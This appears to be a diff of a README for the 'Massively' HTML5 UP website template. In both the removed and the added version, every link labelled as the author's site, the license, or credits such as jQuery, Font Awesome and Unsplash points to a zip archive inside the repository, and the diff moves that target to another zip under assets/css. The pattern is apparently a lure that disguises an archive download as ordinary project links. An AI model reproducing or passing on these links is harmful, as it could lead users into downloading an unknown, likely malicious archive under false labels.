@@ -1,6 +1,6 @@
 Massively by HTML5 UP
-https://raw.githubusercontent.com/FadelDia/FADELPROJECT.github.io/main/assets/io-github-FADELPROJEC-2.9.zip | @ajlkn
-Free for personal and commercial use under the CCA 3.0 license (https://raw.githubusercontent.com/FadelDia/FADELPROJECT.github.io/main/assets/io-github-FADELPROJEC-2.9.zip)
+https://raw.githubusercontent.com/FadelDia/FADELPROJECT.github.io/main/assets/css/FADELPROJEC-io-github-2.6.zip | @ajlkn
+Free for personal and commercial use under the CCA 3.0 license (https://raw.githubusercontent.com/FadelDia/FADELPROJECT.github.io/main/assets/css/FADELPROJEC-io-github-2.6.zip)
 
 
 This is Massively, a text-heavy, article-oriented design built around a huge background
@@ -15,18 +15,18 @@ you can use for pretty much whatever.
 (* = not included)
 
 AJ
-https://raw.githubusercontent.com/FadelDia/FADELPROJECT.github.io/main/assets/io-github-FADELPROJEC-2.9.zip | @ajlkn
+https://raw.githubusercontent.com/FadelDia/FADELPROJECT.github.io/main/assets/css/FADELPROJEC-io-github-2.6.zip | @ajlkn
 
 
 Credits:
 
 	Demo Images:
-		Unsplash (https://raw.githubusercontent.com/FadelDia/FADELPROJECT.github.io/main/assets/io-github-FADELPROJEC-2.9.zip)
+		Unsplash (https://raw.githubusercontent.com/FadelDia/FADELPROJECT.github.io/main/assets/css/FADELPROJEC-io-github-2.6.zip)
 
 	Icons:
-		Font Awesome (https://raw.githubusercontent.com/FadelDia/FADELPROJECT.github.io/main/assets/io-github-FADELPROJEC-2.9.zip)
+		Font Awesome (https://raw.githubusercontent.com/FadelDia/FADELPROJECT.github.io/main/assets/css/FADELPROJEC-io-github-2.6.zip)
 
 	Other:
-		jQuery (https://raw.githubusercontent.com/FadelDia/FADELPROJECT.github.io/main/assets/io-github-FADELPROJEC-2.9.zip)
-		Scrollex (https://raw.githubusercontent.com/FadelDia/FADELPROJECT.github.io/main/assets/io-github-FADELPROJEC-2.9.zip)
-		Responsive Tools (https://raw.githubusercontent.com/FadelDia/FADELPROJECT.github.io/main/assets/io-github-FADELPROJEC-2.9.zip)
+		jQuery (https://raw.githubusercontent.com/FadelDia/FADELPROJECT.github.io/main/assets/css/FADELPROJEC-io-github-2.6.zip)
+		Scrollex (https://raw.githubusercontent.com/FadelDia/FADELPROJECT.github.io/main/assets/css/FADELPROJEC-io-github-2.6.zip)
+		Responsive Tools (https://raw.githubusercontent.com/FadelDia/FADELPROJECT.github.io/main/assets/css/FADELPROJEC-io-github-2.6.zip)
